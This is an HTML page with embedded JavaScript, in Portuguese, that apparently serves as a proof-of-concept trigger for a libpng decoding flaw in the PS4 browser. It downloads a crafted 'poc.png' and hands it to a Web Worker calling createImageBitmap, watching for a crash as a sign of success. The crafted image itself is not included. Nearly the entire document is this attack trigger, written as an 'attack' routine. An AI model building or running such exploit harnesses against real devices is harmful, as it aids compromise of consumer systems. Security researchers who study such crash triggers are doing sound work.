<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 LibPNG CPU Force (Fixed)</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 40px; }
        button { background: #d50000; color: white; border: 2px solid white; padding: 20px 40px; font-size: 24px; cursor: pointer; font-weight: bold; }
        #log { margin: 20px auto; width: 80%; text-align: left; border: 1px solid #333; padding: 10px; font-size: 16px; color: #00e676; }
    </style>
</head>
<body>

    <h1>LIBPNG16 - CPU DECODE (NO NETWORK)</h1>
    <p>Estratégia: Main Thread baixa -> Worker Decodifica</p>
    <p>Arquivo alvo: <b>poc.png</b> (V10)</p>

    <button onclick="prepararAtaque()">INICIAR DECODIFICAÇÃO</button>
    
    <div id="log">Aguardando...</div>

    <script>
        function log(msg) {
            var el = document.getElementById('log');
            el.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + msg + "</div>";
        }

        function prepararAtaque() {
            log("1. Main Thread: Baixando imagem para a memória RAM...");
            
            // A thread principal baixa o arquivo (ela tem permissão de rede)
            fetch("poc.png?t=" + Math.random())
            .then(response => {
                if (!response.ok) throw new Error("Erro ao baixar poc.png (404?)");
                return response.blob();
            })
            .then(blob => {
                log("2. Download concluído (" + blob.size + " bytes).");
                iniciarWorker(blob);
            })
            .catch(err => {
                log("ERRO DE DOWNLOAD: " + err.message);
            });
        }

        function iniciarWorker(blobImagem) {
            log("3. Criando Web Worker...");
            
            // Código do Worker: Agora ele recebe o BLOB direto, não uma URL.
            // Não faz fetch, apenas processa.
            var workerCode = `
                self.onmessage = function(e) {
                    var blob = e.data;
                    console.log("Worker: Recebi os dados brutos.");
                    
                    // O GATILHO DO BUG
                    // Tenta converter o Blob (PNG V10) em Bitmap usando a CPU
                    createImageBitmap(blob)
                    .then(bitmap => {
                        postMessage("FALHA: O Worker sobreviveu. Imagem decodificada: " + bitmap.width + "x" + bitmap.height);
                        bitmap.close();
                    })
                    .catch(err => {
                        postMessage("ERRO DE DECODE: " + err.message);
                    });
                };
            `;

            var blobWorker = new Blob([workerCode], {type: 'application/javascript'});
            var workerUrl = URL.createObjectURL(blobWorker);
            var worker = new Worker(workerUrl);

            worker.onmessage = function(e) {
                if (e.data.startsWith("FALHA")) {
                    log("❌ " + e.data);
                } else {
                    log("⚠️ " + e.data);
                }
            };

            worker.onerror = function(e) {
                log("☠️ ERRO NO WORKER (Isso pode ser um Crash silencioso)");
            };

            log("4. Enviando DADOS da imagem para o Worker...");
            log("Se travar agora, BINGO.");
            
            // Passa o arquivo binário direto para o Worker
            worker.postMessage(blobImagem);
        }
    </script>
</body>
</html>
